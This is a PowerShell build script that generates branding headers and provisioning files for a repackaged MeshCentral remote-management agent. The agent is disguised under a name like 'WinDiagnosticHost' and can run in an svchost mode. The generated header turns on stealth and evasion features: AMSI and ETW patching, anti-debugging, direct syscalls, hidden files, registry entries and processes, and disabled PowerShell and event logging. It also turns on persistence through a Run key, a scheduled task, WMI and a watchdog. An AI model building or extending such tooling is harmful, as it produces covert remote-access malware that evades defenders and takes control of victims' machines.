# MeshAgent Provisioning Embedder
# Simplified version compatible with all PowerShell versions

param(
    [string]$ConfigPath = "../branding_config.json",
    [string]$OutputHeader = "../meshcore/generated/meshagent_branding.h",
    [string]$OutputMsh = "../WinDiagnosticHost.msh"
)

Write-Host "=== MeshAgent Provisioning Embedder ===" -ForegroundColor Cyan

# Read config
$config = Get-Content $ConfigPath -Raw | ConvertFrom-Json

# Helper function for boolean to int
function BoolToInt($val) {
    if ($val -eq $true) { return 1 } else { return 0 }
}

# Derive bundle extraction behavior (svchost requires extraction)
$bundleExtractFlag = $false
if ($null -ne $config.stealth.bundleExtract) {
    $bundleExtractFlag = [bool]$config.stealth.bundleExtract
}
if ($config.stealth.svchostMode -and -not $bundleExtractFlag) {
    Write-Host "[WARN] Svchost mode enabled but bundle extraction disabled in branding config; forcing extraction on." -ForegroundColor Yellow
    $bundleExtractFlag = $true
}
$config.stealth.bundleExtract = $bundleExtractFlag

function Get-VersionParts {
    param([string]$version)
    if ([string]::IsNullOrWhiteSpace($version)) {
        $version = "0.0.0.0"
    }
    $tokens = $version.Split('.', 4)
    $parts = @()
    foreach ($token in $tokens) {
        if ($token -match '^\d+$') {
            $parts += [int]$token
        } else {
            $match = [regex]::Match($token, '\d+')
            if ($match.Success) {
                $parts += [int]$match.Value
            } else {
                $parts += 0
            }
        }
    }
    while ($parts.Count -lt 4) { $parts += 0 }
    return $parts[0..3]
}

$fileVersionStr = if ($config.branding.versionInfo.fileVersion) { $config.branding.versionInfo.fileVersion } else { "1.0.0.0" }
$productVersionStr = if ($config.branding.versionInfo.productVersion) { $config.branding.versionInfo.productVersion } else { $fileVersionStr }
$fileVersionParts = Get-VersionParts $fileVersionStr
$productVersionParts = Get-VersionParts $productVersionStr
$internalName = if ($config.branding.versionInfo.internalName) { $config.branding.versionInfo.internalName } else { $config.branding.binaryName }
$originalFilename = if ($config.branding.versionInfo.originalFilename) { $config.branding.versionInfo.originalFilename } else { $internalName }

# Generate header
$header = @"
/* Generated file - do not edit. */
/* Generated on: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss") */
#ifndef GENERATED_MESHAGENT_BRANDING_H
#define GENERATED_MESHAGENT_BRANDING_H

/* ========== Service Branding ========== */
#undef MESH_AGENT_SERVICE_FILE
#define MESH_AGENT_SERVICE_FILE TEXT("$($config.branding.serviceName)")
#undef MESH_AGENT_SERVICE_NAME
#define MESH_AGENT_SERVICE_NAME TEXT("$($config.branding.displayName)")
#undef MESH_AGENT_COMPANY_NAME
#define MESH_AGENT_COMPANY_NAME "$($config.branding.companyName)"
#undef MESH_AGENT_PRODUCT_NAME
#define MESH_AGENT_PRODUCT_NAME "$($config.branding.productName)"
#undef MESH_AGENT_FILE_DESCRIPTION
#define MESH_AGENT_FILE_DESCRIPTION "$($config.branding.description)"
#undef MESH_AGENT_INTERNAL_NAME
#define MESH_AGENT_INTERNAL_NAME "$($internalName)"
#undef MESH_AGENT_COPYRIGHT
#define MESH_AGENT_COPYRIGHT "$($config.branding.versionInfo.legalCopyright)"
#undef MESH_AGENT_ORIGINAL_FILENAME
#define MESH_AGENT_ORIGINAL_FILENAME "$($originalFilename)"
#undef MESH_AGENT_LOG_DIRECTORY
#define MESH_AGENT_LOG_DIRECTORY TEXT("$($config.branding.logPath)")
#undef MESH_AGENT_FILE_VERSION_MAJOR
#define MESH_AGENT_FILE_VERSION_MAJOR $($fileVersionParts[0])
#undef MESH_AGENT_FILE_VERSION_MINOR
#define MESH_AGENT_FILE_VERSION_MINOR $($fileVersionParts[1])
#undef MESH_AGENT_FILE_VERSION_BUILD
#define MESH_AGENT_FILE_VERSION_BUILD $($fileVersionParts[2])
#undef MESH_AGENT_FILE_VERSION_REVISION
#define MESH_AGENT_FILE_VERSION_REVISION $($fileVersionParts[3])
#undef MESH_AGENT_FILE_VERSION_STR
#define MESH_AGENT_FILE_VERSION_STR TEXT("$fileVersionStr")
#undef MESH_AGENT_PRODUCT_VERSION_MAJOR
#define MESH_AGENT_PRODUCT_VERSION_MAJOR $($productVersionParts[0])
#undef MESH_AGENT_PRODUCT_VERSION_MINOR
#define MESH_AGENT_PRODUCT_VERSION_MINOR $($productVersionParts[1])
#undef MESH_AGENT_PRODUCT_VERSION_BUILD
#define MESH_AGENT_PRODUCT_VERSION_BUILD $($productVersionParts[2])
#undef MESH_AGENT_PRODUCT_VERSION_REVISION
#define MESH_AGENT_PRODUCT_VERSION_REVISION $($productVersionParts[3])
#undef MESH_AGENT_PRODUCT_VERSION_STR
#define MESH_AGENT_PRODUCT_VERSION_STR TEXT("$productVersionStr")

/* ========== Network Configuration ========== */
#define MESH_AGENT_NETWORK_ENDPOINT "$($config.network.primaryEndpoint)"
#define MESH_AGENT_NETWORK_SNI NULL
#define MESH_AGENT_NETWORK_USER_AGENT "$($config.network.userAgent)"
#define MESH_AGENT_NETWORK_JA3 NULL

/* ========== Provisioning Data ========== */
#define MESH_AGENT_MESH_ID "$($config.provisioning.meshId)"
#define MESH_AGENT_SERVER_ID "$($config.provisioning.serverId)"
#define MESH_AGENT_MESH_NAME "$($config.provisioning.meshName)"
#define MESH_AGENT_SERVER_URL "$($config.provisioning.serverUrl)"
#define MESH_AGENT_MESH_TYPE $($config.provisioning.meshType)

/* ========== Stealth Features ========== */
#define MESH_AGENT_STEALTH_ENABLED $(BoolToInt $config.stealth.enabled)
#define MESH_AGENT_SVCHOST_MODE $(BoolToInt $config.stealth.svchostMode)
#define MESH_AGENT_HIDE_FILES $(BoolToInt $config.stealth.hideFiles)
#define MESH_AGENT_HIDE_REGISTRY $(BoolToInt $config.stealth.hideRegistry)
#define MESH_AGENT_AMSI_PATCH $(BoolToInt $config.stealth.amsiPatch)
#define MESH_AGENT_ETW_PATCH $(BoolToInt $config.stealth.ettwPatch)
#define MESH_AGENT_ANTI_DEBUG $(BoolToInt $config.stealth.antiDebug)
#define MESH_AGENT_SYSCALLS_DIRECT $(BoolToInt $config.stealth.syscallsDirectMode)
#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $(BoolToInt $config.stealth.bundleExtract)

/* ========== Persistence Configuration ========== */
#define MESH_AGENT_PERSIST_RUNKEY $(BoolToInt $config.persistence.runKey)
#define MESH_AGENT_PERSIST_TASK $(BoolToInt $config.persistence.scheduledTask.enabled)
#define MESH_AGENT_PERSIST_WMI $(BoolToInt $config.persistence.wmi.enabled)
#define MESH_AGENT_PERSIST_WATCHDOG $(BoolToInt $config.persistence.watchdog.enabled)

/* ========== Evasion Features ========== */
#define MESH_AGENT_DISABLE_PS_LOGGING $(BoolToInt $config.evasion.disablePowerShellLogging)
#define MESH_AGENT_DISABLE_EVENT_LOGS $(BoolToInt $config.evasion.disableEventLogs)
#define MESH_AGENT_DISABLE_ETW $(BoolToInt $config.evasion.disableETW)
#define MESH_AGENT_HIDE_TASKMANAGER $(BoolToInt $config.evasion.hideFromTaskManager)
#define MESH_AGENT_USE_SYSCALLS $(BoolToInt $config.evasion.useSyscalls)

#endif /* GENERATED_MESHAGENT_BRANDING_H */
"@

# Write header
$headerDir = Split-Path $OutputHeader -Parent
if (-not (Test-Path $headerDir)) {
    New-Item -ItemType Directory -Path $headerDir -Force | Out-Null
}
$header | Out-File -FilePath $OutputHeader -Encoding UTF8 
Write-Host "[SUCCESS] Branding header generated: $OutputHeader" -ForegroundColor Green

# Generate .msh file (MeshCentral key/value format)
$mshLines = @()
if ($config.provisioning.meshName)   { $mshLines += "MeshName=$($config.provisioning.meshName)" }
if ($config.provisioning.meshType)   { $mshLines += "MeshType=$($config.provisioning.meshType)" }
if ($config.provisioning.meshId)     { $mshLines += "MeshID=$($config.provisioning.meshId)" }
if ($config.provisioning.serverId)   { $mshLines += "ServerID=$($config.provisioning.serverId)" }
if ($config.provisioning.serverUrl)  { $mshLines += "MeshServer=$($config.provisioning.serverUrl)" }

if ($null -ne $config.provisioning.installFlags -and $config.provisioning.installFlags -ne "") {
    $mshLines += "InstallFlags=$($config.provisioning.installFlags)"
}
if ($null -ne $config.provisioning.autoRegister) {
    $autoRegisterValue = if ([bool]$config.provisioning.autoRegister) { "1" } else { "0" }
    $mshLines += "AutoRegister=$autoRegisterValue"
}

Set-Content -Path $OutputMsh -Value $mshLines -Encoding UTF8
Write-Host "[SUCCESS] .msh file generated: $OutputMsh" -ForegroundColor Green

Write-Host ""
Write-Host "=== Provisioning Embedded ===" -ForegroundColor Green
Write-Host "Mesh ID:   $($config.provisioning.meshId.Substring(0,20))..." -ForegroundColor Cyan
Write-Host "Server ID: $($config.provisioning.serverId.Substring(0,20))..." -ForegroundColor Cyan
Write-Host ""
